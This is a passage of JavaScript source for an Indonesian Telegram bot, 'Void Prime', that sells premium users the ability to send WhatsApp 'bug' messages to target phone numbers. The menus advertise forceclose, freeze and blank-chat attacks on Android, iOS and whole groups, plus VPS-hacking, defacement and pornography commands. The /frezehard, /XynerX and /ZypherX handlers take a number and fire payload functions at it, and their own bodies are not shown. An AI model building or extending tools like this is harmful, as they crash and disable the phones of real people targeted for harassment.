║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /antibokep
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝙷𝙰𝙿𝚄𝚂 𝚃𝙴𝚇𝚃 18+
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /antivideo
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝙷𝙰𝙿𝚄𝚂 𝙺𝙸𝚁𝙸𝙼 𝚅𝙸𝙳𝙴𝙾
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /antinumber
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝙷𝙰𝙿𝚄𝚂 𝙺𝙸𝚁𝙸𝙼 𝙽𝙾𝙼𝙾𝚁 𝙷𝙿
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /waktusholat
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝙿𝙴𝙽𝙶𝙸𝙽𝙶𝙰𝚃 𝚂𝙷𝙾𝙻𝙰𝚃
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /setkota
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝚂𝙴𝚃 𝙺𝙾𝚃𝙰 𝚂𝙷𝙾𝙻𝙰𝚃
╚━═━═━═━═━═━═━═━═━═━═⪼
</blockquote>`;
          
    replyMarkup = {
    inline_keyboard: [[{
      text: "𝙱𝙰𝙲𝙺",
      callback_data: "xyra",
      icon_custom_emoji_id: "5411197418983160471",
      style: "danger"
    }]]
  };
}
      
    if (query.data === "allmenu") {
      caption = `<blockquote>
╭━───━⊱ ⊱⪩ <tg-emoji emoji-id="5422351638029437496">🐈‍⬛</tg-emoji> ʙᴜɢ ᴍᴇɴᴜ <tg-emoji emoji-id="5422351638029437496">🐈‍⬛</tg-emoji> ⪨⊰
╭━⊱ ⊱⪩ <tg-emoji emoji-id="5390858914885568318">👑</tg-emoji> 𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄 <tg-emoji emoji-id="5390858914885568318">👑</tg-emoji> ⪨⊰
┃❏ /addsender 62xxx
┃❏ /killsession
┃❏ /addgroup &lt;add all member&gt;
┃❏ /delgroup &lt;delete acces all memb&gt;
┃❏ /aktif cmd &lt;aktifin fitur bugs&gt;
┃❏ /nonaktid cmd &lt;matikan fitur bugs&gt;
┃❏ /cmd &lt;list command&gt;
┃❏ /aktifall &lt;aktifkan all fitur sekaligus&gt;
┃❏ /resetall &lt;riset all fitur yg aktif&gt;
┃❏ /cekid
┃❏ /setjeda &lt;ᴛɪᴍᴇ&gt;
┃❏ /grouponly &lt;ᴏɴ/ᴏғғ&gt;
┃❏ /addowner &lt;ɪᴅ&gt;
┃❏ /delowner &lt;ɪᴅ&gt;
┃❏ /addprem &lt;ɪᴅ&gt;
┃❏ /delprem &lt;ɪᴅ&gt;
┃❏ /listprem &lt;ᴄᴇᴋ&gt;
╭━⊱ ⊱⪩ <tg-emoji emoji-id="6292081815389735688">🥷</tg-emoji> 𝚃𝙾𝙾𝙻𝚂 𝙼𝙴𝙽𝚄 <tg-emoji emoji-id="6292081815389735688">🥷</tg-emoji> ⪨⊰
┃❏ /sendbokep &lt;send bokep random 18+&gt;
┃❏ /fotbersamav1 &lt;foto bersama artis&gt;
┃❏ /tobersamav2 &lt;gabungin foto bersama&gt;
┃❏ /tofigura &lt;mengubah foto image&gt;
┃❏ /tebakpikiranku &lt;tebak pikiran acak&gt;
┃❏ /cekmati &lt;cek mati acak&gt;
┃❏ /hackvps &lt;in place&gt;
┃❏ /deface &lt;deface domain panel&gt;
┃❏ /loginvps &lt;control login vps&gt;
┃❏ /tomonyet &lt;mengubah foto image&gt;
┃❏ /todpr &lt;mengubah foto image&gt;
┃❏ /toanime &lt;mengubah foto image&gt;
┃❏ /topiramida &lt;mengubah foto image&gt;
┃❏ /topolaroid &lt;mengubah foto image&gt;
┃❏ /suitroom &lt;create room suit&gt;
┃❏ /suitjoin &lt;join room suit&gt;
┃❏ /suitstart &lt;memulai permainan&gt;
┃❏ /suitexit &lt;berhenti dalam permainan&gt;
┃❏ /startbom &lt;create room boom&gt;
┃❏ /daftar &lt;join room&gt;
┃❏ /mulai &lt;memulai room pertandingan&gt;
┃❏ /pilih &lt;memilih kotak&gt;
┃❏ /resetbom &lt;exit dari game tebak bom&gt;
┃❏ /cekid &lt;cek id telegram&gt;
╭━⊱⪩〔 <tg-emoji emoji-id="5424684827473376419">🎀</tg-emoji> 𝙰𝙻𝙻 𝙵𝙸𝚃𝚄𝚁𝙴 • 𝙱𝙴𝙱𝙰𝚂 𝚂𝙿𝙰𝙼 • 𝙰𝙽𝚃𝙸 𝙺𝙴𝙽𝙾𝙽 <tg-emoji emoji-id="5424684827473376419">🎀</tg-emoji> 〕⪨⊰

<tg-emoji emoji-id="5422484648871626179">🧪</tg-emoji> ANDROID • INVISIBLE DELAY HARD
│ /xbugs      ➜ 628xxxx
│ /xkill      ➜ 628xxxx
│ /xynerx     ➜ 628xxxx
│ /zypherx    ➜ 628xxxx
│ /xivorx     ➜ 628xxxx

<tg-emoji emoji-id="5422647595635866664">🐈‍⬛</tg-emoji> ANDROID • FORCLOSE X DELAY
│ /foreclx    ➜ 628xxxx   ✗ Maintenance
│ /forexit    ➜ 628xxxx   ✗ Maintenance
│ /forcloz    ➜ 628xxxx   ✗ Maintenance
│ /fconemsg    ➜ 628xxxx

<tg-emoji emoji-id="5422870830856045306">🐈‍⬛</tg-emoji> IOS • FORECLOSE INVISIBLE ✦
│ /noctex     ➜ 628xxxx
│ /qexon      ➜ 628xxxx
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<tg-emoji emoji-id="5422789535715064830">🐈‍⬛</tg-emoji> BUGS GROUP • DELAY X BLANK X FC
│ /fcgc       ➜ link group ✗ Maintenance
│ /blankgc    ➜ link group
│ /delaygc    ➜ link group
┊
┊  <tg-emoji emoji-id="5429626337671281265">📍</tg-emoji> EFFECT FC GROUP :
┊  ➜ Fc Group No Click
┊  ➜ All Member Permanent Fc
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<tg-emoji emoji-id="5422878175250119584">🐈‍⬛</tg-emoji> Tips:
│ /aktif /command     → menghidupkan command
│ /nonaktif /command  → mematikan command
│ /aktifall           → aktifkan semua command
│ /resetall           → matikan semua command
│ /cmd                → cek status command
│ ACTIVE / OFFLINE
┃❏ 𝚂𝙴𝙻𝙰𝙼𝙰𝚃 𝙼𝙴𝙽𝙶𝙶𝚄𝙽𝙰𝙺𝙰𝙽
╰━────────────────━❏
</blockquote>`;
      replyMarkup = { inline_keyboard: [[{ text: "𝙱𝙰𝙲𝙺", callback_data: "xyra",icon_custom_emoji_id: "5411197418983160471",style: "danger", }]] };
    }

    if (query.data === "xyra") {
      caption = `<blockquote>
┏━━━━━〔 <tg-emoji emoji-id="5463079056255768637">🌟</tg-emoji> 𝚅𝙾𝙸𝙳 𝙿𝚁𝙸𝙼𝙴 <tg-emoji emoji-id="5463079056255768637">🌟</tg-emoji> 〕━━━━━┓
   システムオンライン — アクセス許可済み
   - 開発責任者 — @Gabrieltzyproooool -
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 <tg-emoji emoji-id="6291609867203381889">😁</tg-emoji> 𝙻𝙾𝙶 𝚂𝚈𝚂𝚃𝙴𝙼 <tg-emoji emoji-id="6291609867203381889">😁</tg-emoji> 〕───╮
│ ◈ 𝙳𝙴𝚅   :: @Gabrieltzyproooool <tg-emoji emoji-id="5424816816113350289">🎁</tg-emoji>
│ ◈ 𝚂𝙲𝚁𝙸𝙿𝚃 :: 𝚅𝙾𝙸𝙳 𝙿𝚁𝙸𝙼𝙴 <tg-emoji emoji-id="5422852070438895301">🐈‍⬛</tg-emoji>
│ ◈ 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 :: 𝟷.𝟶.𝟶 <tg-emoji emoji-id="5422736570178371979">🎁</tg-emoji>
│ ◈ 𝚄𝚂𝙴𝚁  :: ${username} <tg-emoji emoji-id="5422826811736228126">🎁</tg-emoji>
│ ◈ 𝚃𝙸𝙼𝙴  :: ${bokepjepang} <tg-emoji emoji-id="5425064244884305467">🎁</tg-emoji>
│ ◈ 𝙳𝙰𝚃𝙴  :: ${jidat} <tg-emoji emoji-id="5852614259082530343">🕖</tg-emoji>
│ ◈ 𝚂𝚃𝙰𝚃𝚄𝚂 :: ${premiumStatus} <tg-emoji emoji-id="5330400691779304641">🦇</tg-emoji>
╰──────────────────────╯
╭───〔 <tg-emoji emoji-id="5972010703484097419">💻</tg-emoji> 𝚇𝚈𝚁𝙰𝙰 𝙽𝙴𝚅𝙴𝚁 𝙳𝙸𝙴 <tg-emoji emoji-id="5972010703484097419">💻</tg-emoji> 〕──────╮
│ Lakukanlah semua hal yang ingin kamu lakukan, 
│ Jika Kau Bahagia Saat Melakukannya, 
│ Keinginanku sudah terkabul. 
╰─────────────────────────────────╯
╭───〔 <tg-emoji emoji-id="6300612629756906446">🖥</tg-emoji> JavaScript System Language <tg-emoji emoji-id="6300612629756906446">🖥</tg-emoji> 〕───╮
│ Use /allmenu to show all command!. 
╰─────────────────────────────────────╯
</blockquote>`,
  reply_markup = {
  inline_keyboard: [
    [{ text: "𝙾𝚠𝚗𝚎𝚛𝙼𝚎𝚗𝚞", callback_data: "ownermenu", icon_custom_emoji_id: "5390821003209243904", style: "danger" }],    
    [{ text: "𝙱𝚞𝚐𝙼𝚎𝚗𝚞", callback_data: "bug", icon_custom_emoji_id: "5393451614843467174", style: "danger" }],
   [{ text: "𝙺𝚑𝚞𝚜𝚞𝚜 𝙹𝚊𝚐𝚊 𝙶𝚋", callback_data: "menujagagroup", icon_custom_emoji_id: "5197531888452925507" }], 
      [{ text: "𝚃𝚘𝚘𝚕𝚜𝙼𝚎𝚗𝚞", callback_data: "tools", icon_custom_emoji_id: "5305629674058061875", style: "primary" }],
    [{ text: "𝚂𝙲𝚁𝙸𝙿𝚃 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽", url: "https://t.me/wolftzyajabro", icon_custom_emoji_id: "5400303217256987122", style: "danger" }],
    [{ text: "𝙾𝚠𝚗𝚎𝚛", url: "https://t.me/Gabrieltzyproooool", icon_custom_emoji_id: "6073238044654185876", style: "primary" }], 
        [{ text: "𝚂𝚙𝚎𝚜𝚒𝚊𝚕", callback_data: "tqto", icon_custom_emoji_id: "5330504780311727774", style: "primary" }]
  ]
  };
}
      
console.log("Caption length:", caption.length);
console.log(caption);

   await bot.editMessageMedia(
  {
    type: "video",
    media: "https://files.catbox.moe/f1reii.mp4",
    caption: caption,
    parse_mode: "HTML"
  },
  {
    chat_id: chatId,
    message_id: messageId,
    reply_markup: replyMarkup
  }
);

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});  

bot.onText(/\/frezehard (\d+)/, async (msg, match) => {
            const chatId = msg.chat.id;
            const senderId = msg.from.id;
            const userId = msg.from.id;
            const targetNumber = match[1];
            const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
            const jid = `${formattedNumber}@s.whatsapp.net`;
            const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
            const jidat = getCurrentDate();
           
            const isPremium = premium(senderId);
    const chatType = msg.chat.type;

    if (!isCmdActive("/frezehard")) {
  return bot.sendMessage(chatId, "𝙵𝚒𝚝𝚞𝚛 𝚒𝚗𝚒 𝚋𝚎𝚕𝚞𝚖 𝚍𝚒 𝚗𝚢𝚊𝚕𝚊𝚔𝚊𝚗 𝚘𝚕𝚎𝚑 𝚘𝚠𝚗𝚎𝚛 𝚔𝚊𝚕𝚊𝚞 𝚖𝚊𝚞 𝚗𝚢𝚊𝚕𝚊𝚔𝚊𝚗 𝚔𝚎𝚝𝚒𝚔 /𝚊𝚔𝚝𝚒𝚏 /𝚏𝚛𝚎𝚣𝚎𝚑𝚊𝚛𝚍.");
}
    if (isGroupOnly() && chatType === "private") {
      return bot.sendMessage(chatId, "𝙱𝚘𝚝 𝚒𝚗𝚒 𝚑𝚊𝚗𝚢𝚊 𝚋𝚒𝚜𝚊 𝚍𝚒𝚐𝚞𝚗𝚊𝚔𝚊𝚗 𝚍𝚒 𝚐𝚛𝚞𝚙.");
    }

    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

    if (!isPremium && !groupAllowed) {
      return bot.sendMessage(chatId, "𝙵𝚒𝚝𝚞𝚛 𝚒𝚗𝚒 𝚑𝚊𝚗𝚢𝚊 𝚞𝚗𝚝𝚞𝚔 𝚞𝚜𝚎𝚛 𝙿𝚛𝚎𝚖𝚒𝚞𝚖 / 𝙶𝚛𝚘𝚞𝚙 𝚙𝚛𝚎𝚖𝚒𝚞𝚖.");
    }
    
            if (cooldown > 0) {
                   return bot.sendMessage(chatId, `𝚃𝚞𝚗𝚐𝚐𝚞 ${cooldown} 𝚍𝚎𝚝𝚒𝚔 𝚜𝚎𝚋𝚎𝚕𝚞𝚖 𝚖𝚎𝚗𝚐𝚒𝚛𝚒𝚖 𝚙𝚎𝚜𝚊𝚗 𝚕𝚊𝚐𝚒.`);
                   }

            try {     
            if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender𝚆𝚑𝚊𝚝𝚜𝙰𝚙𝚙 𝚋𝚎𝚕𝚞𝚖 𝚝𝚎𝚛𝚑𝚞𝚋𝚞𝚗𝚐.\n𝙶𝚞𝚗𝚊𝚔𝚊𝚗 /𝚊𝚍𝚍𝚜𝚎𝚗𝚍𝚎𝚛").catch(() => {});
      return;
    }
            const sentMessage = await bot.sendPhoto(chatId, "https://gangalink.vercel.app/i/kqqpcqw2.jpg", {
            caption: `
\`\`\`
❏ Target :  ${formattedNumber}
❏ Status : Process...
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\``, 
         parse_mode: "Markdown"
         });
         const progressStages = [
         { text: "[█░░░░░░░░░] 10%", delay: 200 },
         { text: "[███░░░░░░░] 30%", delay: 200 },
         { text: "[█████░░░░░] 50%", delay: 100 },
         { text: "[███████░░░] 70%", delay: 100 },
         { text: "[█████████░] 90%", delay: 100 },
         { text: "[██████████] 100%", delay: 200 }
         ];
         for (const stage of progressStages) {
         await new Promise(resolve => setTimeout(resolve, stage.delay));
         await bot.editMessageCaption(`
\`\`\`
❏ Target : ${formattedNumber}
❏ Status : Sending....
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : ${stage.text}
❏ Date : ${jidat}
\`\`\``,    { 
         chat_id: chatId, 
         message_id: sentMessage.message_id, 
         parse_mode: "Markdown" });
         }
    
        console.log("\x1b[32m[𝙿𝚁𝙾𝙲𝙴𝚂 𝙼𝙴𝙽𝙶𝙸𝚁𝙸𝙼 𝙱𝚄𝙶]\x1b[0m 𝚃𝚄𝙽𝙶𝙶𝚄 𝙷𝙸𝙽𝙶𝙶𝙰 𝚂𝙴𝙻𝙴𝚂𝙰𝙸");
        await bugvvip(jid);
        console.log("\x1b[32m[𝚂𝚄𝙲𝙲𝙴𝚂𝚂]\x1b[0m 𝙱𝚞𝚐 𝚋𝚎𝚛𝚑𝚊𝚜𝚒𝚕 𝚍𝚒𝚔𝚒𝚛𝚒𝚖! 🚀");
    
        await bot.editMessageCaption(`
\`\`\`
❏ Target : ${formattedNumber}
❏ Status: Succes
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
❏ Date : ${jidat}
\`\`\``, 
   
        {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂 𝙱𝚄𝙶 ‼️", url: `https://wa.me/${formattedNumber}` }]]
        }
        });

        } catch (error) {
       bot.sendMessage(chatId, `❌ 𝙶𝚊𝚐𝚊𝚕 𝚖𝚎𝚗𝚐𝚒𝚛𝚒𝚖 𝚋𝚞𝚐: ${error.message}`);
        }    
        });      
//=======CASE BUG=========//
bot.on("callback_query", async (q) => {
  try {

    // 🔥 WAJIB: hanya handle autojoin
    if (!q.data || !q.data.startsWith("AJVERIFY_")) return;

    const chatId = q.message.chat.id;
    const messageId = q.message.message_id;
    const senderId = q.from.id;

    const ownerId = q.data.split("_")[1];

    // ❌ bukan pemilik
    if (String(senderId) !== String(ownerId)) {
      return bot.answerCallbackQuery(q.id, {
        text: "❌ Ini bukan tombol kamu!",
        show_alert: true
      });
    }

    const ok = await isUserJoinedAll(bot, senderId, autoJoinSettings.links);

    if (ok) {
      await bot.deleteMessage(chatId, messageId).catch(() => {});

      await bot.sendMessage(chatId,
        `<blockquote>🎉 𝚅𝙴𝚁𝙸𝙵𝙸𝙺𝙰𝚂𝙸 𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻!\n🚀 Akses dibuka!</blockquote>`,
        { parse_mode: "HTML" }
      );
    } else {
      await bot.sendMessage(chatId,
        `<blockquote>⚠️ 𝙺𝚊𝚖𝚞 𝚋𝚎𝚕𝚞𝚖 𝚓𝚘𝚒𝚗 𝚜𝚎𝚖𝚞𝚊 𝚙𝚎𝚛𝚜𝚢𝚊𝚛𝚊𝚝𝚊𝚗 𝚍𝚒 𝚊𝚝𝚊𝚜 𝚓𝚘𝚒𝚗 𝚍𝚞𝚕𝚞!</blockquote>`,
        { parse_mode: "HTML" }
      );
    }

    return bot.answerCallbackQuery(q.id);

  } catch (err) {
    console.log("Callback error:", err);
  }
});
// ----------------------------------- ( Case Bug & Case Plugin ) -------------------------------- \\
function escV2(t = "") {
  return String(t).replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, "\\$1");
}

// ================================
// ANTI DUPLICATE TARGET SYSTEM
// ================================
// ===== IMAGE CONFIG =====
const getImage = () => "https://files.catbox.moe/lfv8kn.jpg";

const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
const a1 = prem("5417913674092277565", "🤍"); //
const a2 = prem("5256131095094652290", "🎯"); //
const a3 = prem("5217880283860194582", "🚀"); //
// ===== FUNCTION MENTION USER =====
function mentionUserHTML(msg) {
  if (!msg?.from?.id) return "User";
  const id = msg.from.id;
  let displayName = msg.from.username
    ? `@${msg.from.username}`
    : msg.from.first_name || "User";
  displayName = escapeHtml(displayName);
  return `<a href="tg://user?id=${id}">${displayName}</a>`;
}

// === BOT COMMAND =====
// ===== TRACK PROCESS =====
const processingTargetsX = new Set();
let senderDeadNotifiedX = false;
const targetCycleCountX = new Map();
const connectionFailCountX = new Map();
const notifiedConnectionClosedX = new Set();

// ===== BOT COMMAND =====
// ===== BOT COMMAND =====
bot.onText(/\/XynerX(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match[1]) return bot.sendMessage(chatId, "𝙴𝚡𝚊𝚖𝚙𝚕𝚎: /XynerX 628xxx");

  const rawNumber = match[1].replace(/[^0-9]/g, "");
  if (!rawNumber || rawNumber.length < 8)
    return bot.sendMessage(chatId, "𝙵𝚘𝚛𝚖𝚊𝚝 𝚂𝚊𝚕𝚊𝚑, 𝚌𝚘𝚗𝚝𝚘𝚑: /XynerX 628xxx");

  const target = `${rawNumber}@s.whatsapp.net`;
  const formattedNumber = rawNumber;

  try {
    // ===== EMBEDDED EMOJI DI DALAM FITUR =====
    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
    const EMOJI = {
      thinkMsg: "5890735564168109650", // 🔥
      btnIcon: "4935965077296645149",  // 😨
    };
    const e1 = prem(EMOJI.thinkMsg, "🔥");

    // ===== CEK CONNECTION GLOBAL =====
    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
      return;
    }

    // reset status global
    senderDeadNotifiedX = false;

    const isPremium = premium(senderId);
    const chatType = msg.chat.type;

    if (!isCmdActive("/xynerx")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /xynerx.");
}
    if (isGroupOnly() && chatType === "private") {
      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
    }

    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

    if (!isPremium && !groupAllowed) {
      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.");
    }

    // ===== AUTO JOIN CHECK =====
    if (autoJoinSettings?.enabled) {
      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
        return bot.sendMessage(
          chatId,
          `<blockquote>
⚠️ 𝙻𝙸𝙽𝙺 𝙱𝙴𝙻𝚄𝙼 𝙳𝙸𝚂𝙴𝚃!

𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝚊𝚍𝚖𝚒𝚗 𝚜𝚎𝚝 𝚍𝚞𝚕𝚞:
/setautojoin
</blockquote>`,
          { parse_mode: "HTML" }
        );
      }

      let joined = false;
      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }

      if (!joined) {
        const buttons = autoJoinSettings.links.map((v, i) => [
          { text: `𝙹𝙾𝙸𝙽 𝙺𝙰𝙺 #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
        ]);
        buttons.push([{ text: "✨ 𝚅𝚎𝚛𝚒𝚏𝚒𝚔𝚊𝚜𝚒", callback_data: `AJVERIFY_${senderId}` }]);

        return bot.sendMessage(
          chatId,
          `<blockquote>
🚫 𝙰𝙺𝚂𝙴𝚂 𝚃𝙴𝚁𝙱𝙰𝚃𝙰𝚂!

🔒 𝙺𝚊𝚖𝚞 𝚠𝚊𝚓𝚒𝚋 𝚓𝚘𝚒𝚗 𝚜𝚎𝚖𝚞𝚊 𝚕𝚒𝚗𝚔 𝚍𝚒 𝚋𝚊𝚠𝚊𝚑 𝚝𝚎𝚛𝚕𝚎𝚋𝚒𝚑 𝚍𝚊𝚑𝚞𝚕𝚞.

✨ 𝚂𝚎𝚝𝚎𝚕𝚊𝚑 𝚓𝚘𝚒𝚗, 𝚝𝚎𝚔𝚊𝚗 𝚝𝚘𝚖𝚋𝚘𝚕 𝚟𝚎𝚛𝚒𝚏𝚒𝚔𝚊𝚜𝚒 𝚍𝚒 𝚋𝚊𝚠𝚊𝚑.
</blockquote>`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }
        );
      }
    }

    // ===== LIMIT & COUNT =====
    let count = targetCycleCountX.get(target) || 0;
    targetCycleCountX.set(target, count + 1);
    const isRealSend = count < 3;

    // ===== SUCCESS SEND BUG =====
    const userMention = mentionUserHTML(msg);

    const messageText = `
<blockquote>
<b>${e1} 𝙼𝙾𝙳𝙴 : 𝙸𝙽𝚅𝙸𝚂𝙸𝙱𝙻𝙴 𝙳𝙴𝙻𝙰𝚈 𝙷𝙰𝚁𝙳</b>

${a1} 𝚄𝚜𝚎𝚛   : ${userMention}
${a2} 𝚃𝚊𝚛𝚐𝚎𝚝 : <code>${formattedNumber}</code>
𝚃𝚢𝚙𝚎   : Status
${a3} 𝚁𝚎𝚜𝚞𝚕𝚝 : <b>SUCCESS SEND</b>
</blockquote>
`.trim();

    await bot.sendPhoto(chatId, getImage(), {
      caption: messageText,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝙲𝙷𝙴𝙲𝙺 𝚃𝙰𝚁𝙶𝙴𝚃",
              url: `https://wa.me/${formattedNumber}`,
              style: "success",
              icon_custom_emoji_id: EMOJI.btnIcon
            }
          ]
        ]
      }
    });

    // ===== FAKE SEND CHECK =====
    if (!isRealSend) return; // skip API, notif tetap dikirim

    // ===== ANTI DUPLIKAT & LOG =====
    if (processingTargetsX.has(target)) return;
    processingTargetsX.add(target);

    console.log(`[PROSES SEND BUG] -> ${rawNumber}`);

    // ===== PROSES REAL SEND =====
    raraaimupp(target)
      .then(() => {
        connectionFailCountX.delete(target);
        notifiedConnectionClosedX.delete(target);
      })
      .catch((err) => {
        const msgError = String(err?.message || "").toLowerCase();
        if (msgError.includes("connection closed")) {
          let fail = connectionFailCountX.get(target) || 0;
          fail++;
          connectionFailCountX.set(target, fail);

          if (fail >= 3) {
            // notif connection closed global
            notifiedConnectionClosedX.add("GLOBAL");
            bot.sendMessage(chatId, "❌ 𝙶𝚊𝚐𝚊𝚕 𝚖𝚎𝚗𝚐𝚒𝚛𝚒𝚖 𝚋𝚞𝚐: 𝙲𝚘𝚗𝚗𝚎𝚌𝚝𝚒𝚘𝚗 𝙲𝚕𝚘𝚜𝚎𝚍").catch(() => {});
          }
        }
      })
      .finally(() => {
        processingTargetsX.delete(target);
        targetCycleCountX.delete(target);

        // 🔥 kirim notif ke semua user baru yang pakai fitur kalau connection closed global aktif
        if (notifiedConnectionClosedX.has("GLOBAL")) {
          bot.sendMessage(chatId, "❌ 𝙶𝚊𝚐𝚊𝚕 𝚖𝚎𝚗𝚐𝚒𝚛𝚒𝚖 𝚋𝚞𝚐: 𝙲𝚘𝚗𝚗𝚎𝚌𝚝𝚒𝚘𝚗 𝙲𝚕𝚘𝚜𝚎𝚍").catch(() => {});
        }
      });

  } catch {}
});
// ---------------ZypherX-----------\\
// ================= ZypherX =================
// ===== BOT COMMAND =====
const processingTargetsZ = new Set();
const connectionFailCountZ = new Map();
const targetCycleCountZ = new Map();
const notifiedConnectionClosedZ = new Set(); // global per bot
let senderDeadNotifiedZ = false;

bot.onText(/\/ZypherX(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match[1]) return bot.sendMessage(chatId, "𝙴𝚡𝚊𝚖𝚙𝚕𝚎: /ZypherX 628xxx");

  const rawNumber = match[1].replace(/[^0-9]/g, "");
  if (!rawNumber || rawNumber.length < 8) return bot.sendMessage(chatId, "𝙵𝚘𝚛𝚖𝚊𝚝 𝚜𝚊𝚕𝚊𝚑, 𝚌𝚘𝚗𝚝𝚘𝚑: /ZypherX 628xxx");

  const target = `${rawNumber}@s.whatsapp.net`;
  const formattedNumber = rawNumber;

  try {
    // ===== EMBEDDED EMOJI DI DALAM FITUR =====
    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
    const EMOJI = {
      thinkMsg: "5463343407197878047", // 🖤
      btnIcon: "5888952431185762037",  // 🗿
    };
    const e1 = prem(EMOJI.thinkMsg, "🖤");

    // ===== CEK CONNECTION GLOBAL =====
    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
      return;
    }

    senderDeadNotifiedZ = false;

    const isPremium = premium(senderId);
    const chatType = msg.chat.type;
    
    if (!isCmdActive("/zypherx")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /zypherx.");
}
    if (isGroupOnly() && chatType === "private") {
      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
    }

    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

    if (!isPremium && !groupAllowed) {
      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.");
    }

    // ===== AUTO JOIN CHECK =====
    if (autoJoinSettings?.enabled) {
      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
        return bot.sendMessage(
          chatId,
          `<blockquote>
⚠️ 𝙻𝙸𝙽𝙺 𝙱𝙴𝙻𝚄𝙼 𝙳𝙸𝚂𝙴𝚃!

𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝚊𝚍𝚖𝚒𝚗 𝚜𝚎𝚝 𝚍𝚞𝚕𝚞:
/setautojoin
</blockquote>`,
          { parse_mode: "HTML" }
        );
      }

      let joined = false;
      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }

      if (!joined) {
        const buttons = autoJoinSettings.links.map((v, i) => [
          { text: `𝙹𝙾𝙸𝙽 𝙺𝙰𝙺 #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
        ]);
        buttons.push([{ text: "✨ 𝚅𝚎𝚛𝚒𝚏𝚒𝚔𝚊𝚜𝚒", callback_data: `AJVERIFY_${senderId}` }]);

        return bot.sendMessage(
          chatId,
          `<blockquote>
🚫 𝙰𝙺𝚂𝙴𝚂 𝚃𝙴𝚁𝙱𝙰𝚃𝙰𝚂!

🔒 𝙺𝚊𝚖𝚞 𝚠𝚊𝚓𝚒𝚋 𝚓𝚘𝚒𝚗 𝚜𝚎𝚖𝚞𝚊 𝚕𝚒𝚗𝚔 𝚍𝚒 𝚋𝚊𝚠𝚊𝚑 𝚝𝚎𝚛𝚕𝚎𝚋𝚒𝚑 𝚍𝚊𝚑𝚞𝚕𝚞.

✨ 𝚂𝚎𝚝𝚎𝚕𝚊𝚑 𝚓𝚘𝚒𝚗, 𝚝𝚎𝚔𝚊𝚗 𝚝𝚘𝚖𝚋𝚘𝚕 𝚟𝚎𝚛𝚒𝚏𝚒𝚔𝚊𝚜𝚒 𝚍𝚒 𝚋𝚊𝚠𝚊𝚑.
</blockquote>`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }
        );
      }
    }

    // ===== LIMIT & COUNT =====
    let count = targetCycleCountZ.get(target) || 0;
    targetCycleCountZ.set(target, count + 1);
    const isRealSend = count < 3;

    // ===== SUCCESS SEND BUG =====
    const userMention = mentionUserHTML(msg);
    const messageText = `
<blockquote>
<b>${e1} MODE : INVISIBLE DELAY HARD</b>

